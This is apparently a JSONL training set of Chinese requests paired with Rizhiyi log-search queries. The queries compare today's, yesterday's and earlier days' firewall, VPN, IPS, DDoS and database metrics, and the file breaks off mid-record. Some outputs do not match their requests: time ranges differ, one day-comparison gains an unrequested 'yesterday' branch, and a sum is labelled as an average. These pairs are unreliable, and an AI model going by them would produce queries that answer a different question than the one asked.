{"input": "设置查询时间范围为今天整天\n查询字段appname值为firewall,标签值为netscreen的数据\n将时间戳按1小时间隔分桶\n统计每bucket中的count数\n将时间戳格式化为HH(24小时制)\n标记这部分数据为“今天”\n追加查询语句,设置时间范围为昨天整天\n其余处理同上一查询\n标记这部分数据为“昨天”\n再追加查询语句,设置时间范围为1周前那天整天\n其余处理同第一个查询\n标记这部分数据为“一周前”", "instruction": "如何生成日志易查询以获取今天、昨天和一周前，netscreen防火墙的网络监控数据趋势同比统计？", "output": "starttime=\"now/d\" endtime=\"now\" appname:firewall tag:netscreen | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:firewall tag:netscreen | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"昨天\"]] | append [[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:firewall tag:netscreen | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"一周前\"]]"}
{"input": "设置查询时间范围为昨天整天\n查询appname为ips,标签为mcafee,级别不为Informational的数据\n将时间戳按1小时间隔分桶\n统计每bucket中的count数\n标记这部分数据为“昨天”\n追加查询语句,设置时间范围为上周同一天整天\n其余处理同上一查询\n标记这部分数据为“上周同一天”\n再追加查询语句,设置时间范围为今天整天\n其余处理同第一个查询\n标记这部分数据为“今天”", "instruction": "我想问如何在日志易中生成今天和上周同一天的 mcafee IPS 安全威胁同比分析报告。从日志中检索数据并按时间对其进行汇总。使用时序图表显示结果。", "output": "starttime=\"-1d/d\" endtime=\"now/d\" appname:ips tag:mcafee NOT ips.level:Informational|bucket timestamp span=1h as ts| stats count() as cnt by ts|eval line=\"昨天\"|append [[ starttime=\"-7d/d\" endtime=\"-6d/d\" appname:ips tag:mcafee NOT ips.level:Informational |bucket timestamp span=1h as ts | stats count() as cnt by ts |eval line=\"上周同一天\"]]|append [[ starttime=\"now/d\" endtime=\"now\" appname:ips tag:mcafee NOT ips.level:Informational |bucket timestamp span=1h as ts | stats count() as cnt by ts |eval line=\"今天\"]]"}
{"input": "设置查询时间范围为昨天整天\n查询appname为firewall,标签为fortinet,子类型为ips的数据\n将时间戳按30分钟间隔分桶\n统计每bucket中的count数\n将时间戳格式化为HH:mm(24小时制带分钟)\n标记这部分数据为“yesterday”\n追加查询语句,设置时间范围为今天整天\n其余处理同上一查询\n标记这部分数据为“today”", "instruction": "我想要知道昨天和今天的入侵事件数量以及每小时发生的次数。", "output": "starttime=\"-1d/d\" endtime=\"now/d\" (* AND appname:firewall  tag:fortinet firewall.subtype:ips) |bucket timestamp span=30m as ts |stats count() as _count by ts | eval time = formatdate(ts,\"HH:mm\")|eval line = \"yesterday\"| append[[  starttime=\"now/d\" endtime=\"now\" (* AND appname:firewall  tag:fortinet firewall.subtype:ips)  |bucket timestamp span=30m as ts  |stats count() as _count by ts  | eval time = formatdate(ts,\"HH:mm\") |eval line = \"today\"]]"}
{"input": "设置查询时间范围为昨天整天\n查询标签为koal_ssl的数据\n统计每天的数据条数\n标记这部分数据为“昨天”\n追加查询语句,设置时间范围为今天整天\n其余处理同上一查询\n标记这部分数据为“今天”\n按时间戳正序排序", "instruction": "我想问带有koal_ssl标签的日志，昨天和今天分别有多少条数据。", "output": "starttime=\"-1d/d\" endtime=\"now/d\"  tag:koal_ssl  |stats count() as tally by ts |eval line=\"昨天\" |append [[starttime=\"now/d\" endtime=\"now\"  tag:koal_ssl  |stats count() as tally by ts |eval line=\"今天\" ]] |sort by +ts"}
{"input": "设置查询时间范围为今天整天\n查询appname为redis的数据\n将时间戳按10分钟间隔分桶\n统计每bucket中的keyspace_misses平均值\n标记这部分数据为“今天”\n将时间戳格式化为HH:mm(24小时制带分钟)\n追加查询语句,设置时间范围为昨天整天\n其余处理同上一查询\n标记这部分数据为“昨天”", "instruction": "我想问你昨天和今天的 redis KeyMiss 次数有没有变化，可以把结果画出来吗？", "output": "starttime=\"now/d\" endtime=\"now\" appname:redis  | bucket timestamp span=10m as ts | stats avg(redis.keyspace_misses) as 'KeyMiss次数趋势' by ts | eval day=\"今天\" |eval time=formatdate(ts, \"HH:mm\") | append [[starttime=\"now-1d/d\" endtime=\"now/d\" appname:redis | bucket timestamp span=10m as ts | stats avg(redis.keyspace_misses) as 'KeyMiss次数趋势' by ts | eval day=\"昨天\" |eval time=formatdate(ts, \"HH:mm\")]]"}
{"input": "设置查询时间范围为今天整天\n查询appname为redis的数据\n将时间戳按10分钟间隔分桶\n统计每bucket中的rejected_connections平均值\n标记这部分数据为“今天”\n将时间戳格式化为HH:mm(24小时制带分钟)\n追加查询语句,设置时间范围为昨天整天\n其余处理同上一查询\n标记这部分数据为“昨天”", "instruction": "我想问你昨天和今天的Redis被拒绝连接数量有没有变化？你可以帮我把这两个时间段的数据都查出来并按每10 分钟区间做对比吗？", "output": "starttime=\"now/d\" endtime=\"now\" appname:redis | bucket timestamp span=10m as ts | stats avg(redis.rejected_connections) as '被拒绝连接数趋势' by ts | eval day=\"今天\" |eval time=formatdate(ts, \"HH:mm\") | append [[starttime=\"now-1d/d\" endtime=\"now/d\" appname:redis | bucket timestamp span=10m as ts | stats avg(redis.rejected_connections) as '被拒绝连接数趋势' by ts | eval day=\"昨天\" |eval time=formatdate(ts, \"HH:mm\")]]"}
{"input": "设置时间范围为昨天整天到现在\n查询appname为haproxy的数据\n将时间戳按30分钟间隔分桶\n统计每桶中的COUNT数\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为前天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"\n将时间戳格式化为HH:mm", "instruction": "我想问的是，昨天和前两天的访问量有什么不同吗？从七天之前开始统计呢？你能不能把这段时间分成几个小时或者一天的时间段，看下每天的访问量变化趋势吗？", "output": "starttime=\"-1d/d\" endtime=\"now\" appname:haproxy|bucket timestamp span=30m as ts|stats count() as cnt by ts|eval line=\"今天\"|append [[starttime=\"-2d/d\" endtime=\"-1d/d\" appname:haproxy|bucket timestamp span=30m as ts|stats count() as cnt by ts|eval line=\"昨天\"]]|append [[starttime=\"-8d/d\" endtime=\"-7d/d\" appname:haproxy|bucket timestamp span=30m as ts|stats count() as cnt by ts|eval line=\"上周\"]]|eval time=formatdate(ts,\"HH:mm\")"}
{"input": "设置时间范围为今天整天\n查询appname为honeypot, tag为chaitin, 来源为scanner的数据\n统计COUNT数\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"\n追加查询语句,设置时间范围为前天整天\n其余处理逻辑相同\n标记这部分数据为\"前天\"", "instruction": "我想问的是，昨天、前天和今天分别有多少条长亭漏洞扫描数据？请帮忙把结果打印出来。", "output": "starttime=\"now/d\" endtime=\"now\" appname:honeypot tag:chaitin  hp.source:scanner| stats count() as cnt|eval line=\"今天\"|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:honeypot tag:chaitin  hp.source:scanner | stats count() as cnt |eval line=\"昨天\"]]|append [[ starttime=\"-2d/d\" endtime=\"-1d/d\" appname:honeypot tag:chaitin  hp.source:scanner | stats count() as cnt |eval line=\"前天\"]]"}
{"input": "设置时间范围为昨天整天到现在\n查询appname为exchange,tag为tracking的数据\n统计exchange.total_bytes总量\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"", "instruction": "我想询问的是昨天和今天的exchange tracking数据总字节数的对比情况？", "output": "starttime=\"now/d\" endtime=\"now\" appname:exchange tag:tracking | stats sum(exchange.total_bytes ) as count_| eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:exchange tag:tracking | stats sum(exchange.total_bytes) as count_| eval line=\"昨天\"]] "}
{"input": "设置时间范围为今天整天\n查询appname为oracle,tag为iops_mbps的数据\n统计读写吞吐量的平均值\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"", "instruction": "我想问一下，昨天和今天的数据库ORACLE读写吞吐量有什么不同吗？请告诉我它们之间的比较结果。", "output": "starttime=\"now/d\" endtime=\"now\" appname:oracle AND tag:iops_mbps |  stats avg(oracle.MBPS) as avg_|eval line=\"今天\"| append [[  starttime=\"now-1d/d\" endtime=\"now/d\"  appname:oracle AND tag:iops_mbps  |  stats avg(oracle.MBPS) as avg_  |eval line=\"昨天\" ]]| fields time,avg_,line"}
{"input": "设置时间范围为昨天整天\n查询appname为dbaudit的数据\n将时间戳按5分钟间隔分桶\n计算每个bucket的平均响应时间\n标记这部分数据为\"昨天\"\n追加查询语句,设置时间范围为今天整天\n其余处理逻辑相同\n标记这部分数据为\"今天\"\n再追加查询语句,设置时间范围为上周同一天\n其余处理逻辑相同\n标记这部分数据为\"上周\"", "instruction": "我想问的是，昨天到现在dbaudit的db.msg.response_time平均响应时间和今天有什么不同趋势吗？又和上周走势有什么不同呢？", "output": "starttime=\"-1d/d\" endtime=\"now/d\" appname:dbaudit db.Logtype:*  |bucket timestamp span=5m as ts  |eval time=formatdate(ts,\"HH:mm\")|eval avg_t=tolong(db.msg.response_time)| stats sum(avg_t) as avg_re_time by time|eval line=\"昨天\"|append[[ starttime=\"now/d\" endtime=\"now\" appname:dbaudit db.Logtype:*   |bucket timestamp span=5m as ts  |eval time=formatdate(ts,\"HH:mm\") |eval avg_t=tolong(db.msg.response_time) | stats sum(avg_t) as avg_re_time by time |eval line=\"今天\"]]|append[[  starttime=\"-7d/d\" endtime=\"-6d/d\" appname:dbaudit db.Logtype:*   |bucket timestamp span=5m as ts   |eval time=formatdate(ts,\"HH:mm\") |eval avg_t=tolong(db.msg.response_time) | stats sum(avg_t) as avg_re_time by time |eval line=\"上周\"]]"}
{"input": "设置时间范围为昨天整天\n查询appname为dbaudit的数据\n计算平均响应时间\n标记这部分数据为\"昨天\"\n追加查询语句,设置时间范围为今天整天\n其余处理逻辑相同\n标记这部分数据为\"今天\"\n再追加查询语句,设置时间范围为上周同一天\n其余处理逻辑相同\n标记这部分数据为\"上周\"", "instruction": "我想问的是，dbaudit昨天和今天的平均响应时间(db.msg.response_time)分别是多少？以及，过去一周的平均响应时间有多长？", "output": "starttime=\"-1d/d\" endtime=\"now/d\" appname:dbaudit db.Logtype:*  |eval avg_t=tolong(db.msg.response_time)| stats avg(avg_t) as avg_re_time |eval line=\"昨天\"|append[[ starttime=\"now/d\" endtime=\"now\" appname:dbaudit db.Logtype:*   |eval avg_t=tolong(db.msg.response_time) | stats avg(avg_t) as avg_re_time  |eval line=\"今天\"]]|append[[  starttime=\"-7d/d\" endtime=\"-6d/d\" appname:dbaudit db.Logtype:*   |eval avg_t=tolong(db.msg.response_time) | stats avg(avg_t) as avg_re_time |eval line=\"上周\"]]"}
{"input": "设置时间范围为今天整天\n查询appname为cupp,日志内容为\"收到报文\"的数据\n将时间戳按1小时间隔分桶\n统计每个bucket中的唯一消息ID数量\n将时间戳格式化为HH:mm\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"", "instruction": "我想问的是，cupp应用昨天和今天哪一天的消息数量更多？请帮我把这两个时间段的数据都查出来并比较一下吧！", "output": "starttime=\"now/d\" endtime=\"now\" appname:cupp \"收到报文\" | bucket timestamp span=1h as ts |stats dc(msgid) by ts|eval hour=formatdate(ts,\"HH:mm\")|eval date=\"今天\" |append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:cupp \"收到报文\" |bucket timestamp span=1h as ts |stats dc(msgid) by ts | eval hour=formatdate(ts,\"HH:mm\")|eval date=\"昨天\"   ]]"}
{"input": "设置时间范围为今天整天\n查询appname为fortress,tag为jumpserver,日志类型为login_log的数据\n统计数量\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"\n再追加查询语句,设置时间范围为上周同一天\n其余处理逻辑相同\n标记这部分数据为\"上周\"", "instruction": "我想问的是，昨天、前一天和最近的七天中，有没有人使用了fortress“跳板机”应用进行登录？", "output": "starttime=\"now/d\" endtime=\"now\" appname:fortress tag:jumpserver  fortress.log_type:login_log |  stats count() as cnt | eval line=\"今天\"|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:fortress tag:jumpserver fortress.log_type:login_log  |  stats count() as cnt  | eval line=\"昨天\"]]|append [[  starttime=\"-7d/d\" endtime=\"-6d/d\" appname:fortress tag:jumpserver fortress.log_type:login_log  |  stats count() as cnt  | eval line=\"上周\"]]"}
{"input": "设置时间范围为今天整天\n查询appname为fortress,标签包含safety的数据\n将时间戳按30分钟间隔分桶\n统计每个bucket中的数量\n将时间戳格式化为HH:mm\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"\n再追加查询语句,设置时间范围为上周同一天\n其余处理逻辑相同\n标记这部分数据为\"上周\"", "instruction": "我想问的是，在过去一天、一周和一个月内，有多少条记录包含关键字“安全”且应用名为“堡垒机”，时间格式化成小时：分钟的形式呈现给我看。", "output": "starttime=\"now/d\" endtime=\"now\" appname:fortress tag:safety  |bucket timestamp span=30m as ts| stats count() as cnt by   ts|eval ts=formatdate(ts,\"HH:mm\")| eval line=\"今天\"|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:fortress tag:safety  |bucket timestamp span=30m as ts | stats count() as cnt by   ts |eval ts=formatdate(ts,\"HH:mm\") | eval line=\"昨天\"]]|append [[  starttime=\"-7d/d\" endtime=\"-6d/d\" appname:fortress tag:safety  | bucket timestamp span=30m as ts   | stats count() as cnt by   ts |eval ts=formatdate(ts,\"HH:mm\") | eval line=\"上周\"]]"}
{"input": "设置时间范围为今天整天\n查询appname为vpn,tag为sangfor_0trust,事件类型为auth/login/logout,结果为FAILED的数据\n统计数量\n标记这部分数据为\"今天\"\n追加查询语句,设置时间范围为昨天整天\n其余处理逻辑相同\n标记这部分数据为\"昨天\"\n再追加查询语句,设置时间范围为前天整天\n其余处理逻辑相同\n标记这部分数据为\"前天\"", "instruction": "我想问的是，过去三天有多少次深信服 VPN 认证失败的情况？你可以把结果打印出来吗？谢谢！", "output": "starttime=\"now/d\" endtime=\"now\" appname:vpn tag:sangfor_0trust  (vpn.event_name:auth OR vpn.event_name:login OR vpn.event_name:logout) vpn.result:FAILED | stats count() as cnt |eval line=\"今天\"|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:vpn tag:sangfor_0trust  (vpn.event_name:auth OR vpn.event_name:login OR vpn.event_name:logout) vpn.result:FAILED | stats count() as cnt  |eval line=\"昨天\"]]|append [[ starttime=\"-2d/d\" endtime=\"-1d/d\" appname:vpn tag:sangfor_0trust (vpn.event_name:auth OR vpn.event_name:login OR vpn.event_name:logout) vpn.result:FAILED  | stats count() as cnt  |eval line=\"前天\"]]"}
{"input": "设置时间范围为今天\n查询appname为vpn,tag为cisco,事件类型为login,结果为fail开头的数据\n将时间戳按30分钟间隔分桶\n统计每个桶中的数量\n标记数据为“今天”\n追加查询语句,设置范围为昨天\n处理逻辑相同,标记为“昨天”\n再追加查询语句,设置范围为前天\n处理逻辑相同,标记为“前天”\n格式化时间戳为HH:mm:ss", "instruction": "我想询问的是最近三天内思科 VPN 登录失败的情况，并且希望将结果以图表形式展示。", "output": "starttime=\"now/d\" endtime=\"now\" appname:vpn tag:cisco (vpn.actype:login AND vpn.result:fail*)| bucket timestamp span=30m as ts | stats count() as cnt by ts|eval line=\"今天\"|append[[ starttime=\"-1d/d\" endtime=\"now/d\"  appname:vpn tag:cisco (vpn.actype:login AND vpn.result:fail*)| bucket timestamp span=30m as ts | stats count() as cnt by ts|eval line=\"昨天\"|append[[starttime=\"-2d/d\" endtime=\"-1d/d\" appname:vpn tag:cisco (vpn.actype:login AND vpn.result:fail*)| bucket timestamp span=30m as ts | stats count() as cnt by ts|eval line=\"前天\"]]]]|eval time=formatdate(ts,\"HH:mm:ss\")"}
{"input": "设置时间范围为昨天整天\n查询appname为firewall,tag为cisco_asa,事件名称包含\"连接失败\"的数据\n将时间戳按1小时间隔分桶\n统计每个桶中的数量\n将时间戳格式化为HH(24小时制)\n标记数据为“昨天”\n追加查询语句,设置范围为一周前\n处理逻辑相同,标记为“一周前”", "instruction": "我想问的是，昨天和七天之前有哪些时段有访问被思科 ASA 拒绝了吗？你能帮我把这些数据整理成表格吗？", "output": "starttime=\"-1d/d\" endtime=\"now/d\" appname:firewall tag:cisco_asa firewall.event_name:*连接失败* | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"昨天\" | append [[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:firewall tag:cisco_asa firewall.event_name:*连接失败* | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"一周前\"]] | table line, hour, count_"}
{"input": "设置三个不同时间范围的查询，除时间范围以外，都查询appname为vpn,tag为cisco,包含authentication failure的用户日志\n将时间戳按30分钟间隔分桶\n格式化时间戳为HH:mm\n统计数量\n最后分别标记为\"今天\",\"昨天\",\"前天\"并追加到一起", "instruction": "我想询问的是思科 VPN 用户在过去三天的登录失败数量和时间分布情况。", "output": "starttime=\"now/d\" endtime=\"now\" appname:vpn tag:cisco vpn.user:* \"authentication\" \"failure\"|bucket timestamp span=30m as ts|eval time=formatdate(ts,\"HH:mm\") | stats count() as cnt by time|eval line=\"今天\"|append[[starttime=\"-1d/d\" endtime=\"now/d\" appname:vpn tag:cisco vpn.user:* \"authentication\" \"failure\"|bucket timestamp span=30m as ts|eval time=formatdate(ts,\"HH:mm\") | stats count() as cnt by time|eval line=\"昨天\"]]|append[[starttime=\"-2d/d\" endtime=\"-1d/d\" appname:vpn tag:cisco vpn.user:* \"authentication\" \"failure\"|bucket timestamp span=30m as ts|eval time=formatdate(ts,\"HH:mm\") | stats count() as cnt by time|eval line=\"前天\"]]"}
{"input": "设置三个时间范围分别是今天、昨天整天和七天前整天的查询，除时间外，都查询appname为ddos,tag为nsfocus_m的数据\n重命名字段\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计满足条件的数量\n最后分别标记为\"今天\",\"昨天\",\"上周\"追加起来。", "instruction": "我想问的是绿盟日志中，昨天、现在以及最近七天内，有多少个时段的攻击请求带宽超过了 50 kbps？", "output": "starttime=\"now/d\" endtime=\"now\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,bps|eval line=\"今天\"|append[[ starttime=\"-1d/d\" endtime=\"now/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,bps |eval line=\"昨天\"]]|append[[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,bps |eval line=\"上周\"]]"}
{"input": "追加三个时间范围分别是今天、昨天整天和七天前整天的查询，除时间外，都查询appname为ddos,tag为nsfocus_m的数据\n重命名字段\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计数量\n标记为\"今天\",\"昨天\",\"上周\"合在一起", "instruction": "我想查询一下绿盟的日志，问问昨天、前天和一周前的 ddos 攻击情况有什么不同趋势吗？", "output": "starttime=\"now/d\" endtime=\"now\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,pps|eval line=\"今天\"|append[[ starttime=\"-1d/d\" endtime=\"now/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,pps |eval line=\"昨天\"]]|append[[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")| stats count() as cnt by time,pps |eval line=\"上周\"]]"}
{"input": "设置时间范围为今天和上周\n查询appname为ddos,tag为nsfocus_m的数据\n重命名字段\n统计总数量\n标记为\"今天\",\"上周\"", "instruction": "我想知道今天和前一周的绿盟 ddos 设备记录的攻击情况。", "output": "starttime=\"now/d\" endtime=\"now\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| stats count() as cnt |eval line=\"今天\"|append[[ starttime=\"-1d/d\" endtime=\"now/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *| stats count() as cnt  |eval line=\"昨天\"]]|append[[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:ddos tag:nsfocus_m |rename ddos.* as *,msg.* as *|  stats count() as cnt  |eval line=\"上周\"]]"}
{"input": "把过去的两天分别设置为两个查询的时间范围\n都查询appname为waf,tag为imperva,级别为High或高的数据\n将时间戳按15分钟间隔分桶\n统计数量\n格式化时间戳为HHmm\n标记为\"今天\",\"昨天\"", "instruction": "我想问的是，今天和昨天的 WAF 高危访问量有没有显著变化？请帮我把这两个问题合并在一起，并按时段排序。", "output": "starttime=\"now/d\" endtime=\"now\"appname:waf AND tag:imperva AND (waf.level:High OR waf.level:\"高\")|bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\"appname:waf AND tag:imperva AND (waf.level:High OR waf.level:\"高\")|bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"昨天\"]]"}
{"input": "三个查询分别各自设置时间范围为过去的三天\n查询appname为middleware,tag为tomcat的数据\n将时间戳按15分钟间隔分桶\n统计数量\n格式化时间戳为HHmm\n标记为\"前天\",\"昨天\",\"今天\"", "instruction": "我想知道tomcat昨天和今天的访问量分别为多少。请帮忙把这两天的数据合并在一起。同时也希望能按小时进行分组。", "output": "starttime=\"-2d/d\" endtime=\"-1d/d\"(appname:middleware tag:tomcat) |bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"前天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\"(appname:middleware tag:tomcat) |bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"昨天\"]]|append [[starttime=\"now/d\" endtime=\"now\"(appname:middleware tag:tomcat)|bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"今天\"]]"}
{"input": "设置三个查询的时间范围为今天、昨天和上周同期的那整天\n查询appname为ips,事件名称为IPS攻击事件的数据\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计数量\n标记为\"上周\",\"昨天\",\"今天\"", "instruction": "我想问的是，你最近一周有没有记录到 IPS 攻击事件？如果有的话，那么在今天、昨天或者上周同期的哪个时间段内发生的呢？", "output": "starttime=\"-7d/d\" endtime=\"-1d/d\"(appname:ips ips.event_name:IPS攻击事件) | bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")|stats count()  as cnt by time|eval line=\"上周\" | append [[starttime=\"-1d/d\" endtime=\"now/d\"(appname:ips  ips.event_name:IPS攻击事件) | bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")|stats count() as cnt by time|eval line=\"昨天\"]] |append [[starttime=\"now/d\" endtime=\"now\"(appname:ips ips.event_name:IPS攻击事件) | bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")|stats count() as cnt by time|eval line=\"今天\"]]"}
{"input": "分别为三个查询设置时间范围为过去的三天\n都查询appname为middleware,tag为iis的数据\n将时间戳按15分钟间隔分桶\n统计数量\n格式化时间戳为HHmm\n标记为\"前天\",\"昨天\",\"今天\"，最后把三个查询依次追加合并。", "instruction": "我想问的是，从一周前，昨天，今天的哪个时间段内有最多的 IIS 报警？", "output": "starttime=\"-2d/d\" endtime=\"-1d/d\"(appname:middleware tag:iis) |bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"前天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\"(appname:middleware tag:iis) |bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"昨天\"]]|append [[starttime=\"now/d\" endtime=\"now\"(appname:middleware tag:iis)|bucket timestamp span=15m as ts |stats count() by ts|eval ts1=formatdate(ts,\"HHmm\")|eval line=\"今天\"]]"}
{"input": "三个时间范围分别为今天、昨天和一周前的查询\n除时间范围外，均查询appname为apache,tag为access的数据\n将时间戳按1小时间隔分桶\n统计数量\n格式化时间戳为HH(24小时制)\n三个查询分别标记为\"今天\"、\"昨天\"、\"一周前\" 并追加在一起", "instruction": "我想问的是，今天、昨天和七天前有没有出现过“访问 Apache”的行为，如果有的话，那它发生的时间分别在哪些时间段内？", "output": "starttime=\"now/d\" endtime=\"now\" appname:apache tag:access | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:apache tag:access | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"昨天\"]] | append [[starttime=\"-7d/d\" endtime=\"-6d/d\" appname:apache tag:access | bucket timestamp span=1h as ts|stats count() as count_ by ts| eval hour=formatdate(tolong(ts),\"HH\")|eval line=\"一周前\"]]"}
{"input": "给三个查询各自设置时间范围为过去的三天\n查询appname为firewall,tag为sonicwall,包含\"dropped\"的数据\n将时间戳按30分钟间隔分桶\n统计数量\n格式化时间戳为HH\n标记为\"前天\"、\"昨天\"、\"今天\"后合并在一起", "instruction": "我想问的是，过去三天的防火墙丢包情况如何呢？你能不能把按三十分钟统计的结果以表格的形式展示给我？", "output": "starttime=\"-2d/d\" endtime=\"-1d/d\"appname:firewall AND tag:sonicwall \"dropped\" |bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"3 前天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\"appname:firewall AND tag:sonicwall \"dropped\" |bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"2 昨天\"]]|append [[starttime=\"now/d\" endtime=\"now\"appname:firewall AND tag:sonicwall \"dropped\" |bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"1 今天\"]]"}
{"input": "多个子查询，分别设置不同的时间范围，代表过去的三天\n统一查询appname为firewall,tag为sonicwall,包含\"scan detected\"的数据\n将时间戳按30分钟间隔分桶\n统计数量\n格式化时间戳为HH\n把三个查询标记为\"前天\"、\"昨天\"、\"今天\"并追加起来", "instruction": "我想问的是，今天、昨天和前天有多少次 SonicWall 防火墙发生扫描事件？并且把结果按时间段分组显示在不同的行中。", "output": "starttime=\"-2d/d\" endtime=\"-1d/d\"appname:firewall AND tag:sonicwall \"scan detected\" |bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"前天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\"appname:firewall AND tag:sonicwall \"scan detected\" |bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"昨天\"]]|append [[starttime=\"now/d\" endtime=\"now\"appname:firewall AND tag:sonicwall \"scan detected\"|bucket timestamp span=30m as ts | stats count() as total by ts|eval ts1=formatdate(ts,\"HH\")|eval line=\"今天\"]]"}
{"input": "设置追加在一起的两个查询的时间范围分别为今天和昨天\n查询appname为oracle,tag为dbtime的数据\n将时间戳按1小时间隔分桶\n统计数量\n格式化时间戳为HH:mm\n标记行为\"今天\"、\"昨天\"", "instruction": "我想询问今天的Oracle数据库运行时间以及昨日同期的趋势数据。", "output": "starttime=\"now/d\" endtime=\"now\" appname:oracle tag:dbtime | bucket timestamp span=1h as ts | stats count() by ts,'oracle.DB_Time(s)'|eval time=formatdate(ts,\"HH:mm\")|eval line=\"今天\" | append [[  starttime=\"now-1d/d\" endtime=\"now/d\" appname:oracle tag:dbtime  | bucket timestamp span=1h as ts  | stats count() by ts,'oracle.DB_Time(s)' |eval time=formatdate(ts,\"HH:mm\") |eval line=\"昨天\" ]]| rename 'oracle.DB_Time(s)' as dbtime"}
{"input": "设置时间范围为过去三天的三个查询\n统一查询飞塔SBR日志,排除审计和告警日志\n重命名字段\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计数量\n分别标记为\"昨天\"、\"今天\"、\"上周\"并追加在一起", "instruction": "我想问的是，飞塔的 SBR 日志里，排除审计日志和系统告警以外，昨天、今天和上周分别有几条记录？请列出时间段及数量。", "output": "starttime=\"-1d/d\" endtime=\"now/d\" appname:fortress tag:sbr  (NOT fortress.log_type:AUDIT_LOG NOT fortress.log_type:SYS_STATE_ALARM) | rename fortress.* as * | bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")|stats count() as cnt by time |eval line=\"昨天\"|append[[ starttime=\"now/d\" endtime=\"now\" appname:fortress tag:sbr  (NOT fortress.log_type:AUDIT_LOG NOT fortress.log_type:SYS_STATE_ALARM) | rename fortress.* as * | bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")|stats count() as cnt by time|eval 